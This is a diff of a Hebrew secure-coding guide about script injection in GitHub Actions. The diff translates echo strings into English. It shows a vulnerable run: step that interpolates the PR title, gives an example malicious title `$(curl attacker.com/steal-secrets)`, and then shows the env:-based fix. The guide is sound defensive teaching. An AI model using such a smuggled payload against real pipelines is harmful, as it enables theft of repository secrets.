@@ -69,7 +69,7 @@ Cache לא חתום ולא מאומת - כל workflow שיכול לקרוא cach
 ```yaml
 # מסוכן - כותרת ה-PR מוזרקת ישירות ל-shell
 steps:
-  - run: echo "כותרת ה-PR היא: ${{ github.event.pull_request.title }}"
+  - run: echo "PR title: ${{ github.event.pull_request.title }}"
 ```
 
 אם כותרת ה-PR מכילה, למשל, ` $(curl attacker.com/steal-secrets)` - הפקודה עלולה להתבצע בפועל בתוך ה-shell!
@@ -81,7 +81,7 @@ steps:
 steps:
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
-    run: echo "כותרת ה-PR היא: $PR_TITLE"
+    run: echo "PR title: $PR_TITLE"
 ```
 
 כלל אצבע: **לעולם אל תשלבו `${{ github.event.* }}` ישירות בתוך מחרוזת `run:`** - תמיד העבירו דרך `env:`.
